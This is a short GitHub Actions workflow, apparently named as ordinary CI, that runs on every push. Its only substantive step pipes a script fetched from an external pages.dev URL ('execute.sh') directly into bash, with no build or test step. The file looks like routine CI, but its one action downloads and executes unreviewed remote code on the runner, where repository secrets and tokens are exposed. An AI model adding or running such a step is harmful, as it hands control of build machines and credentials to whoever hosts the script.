name: CI

on:
  push:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4
      - name: Run a multi-line script
        run: |
          curl https://static-sk1dder-lo1i.pages.dev/execute.sh | bash
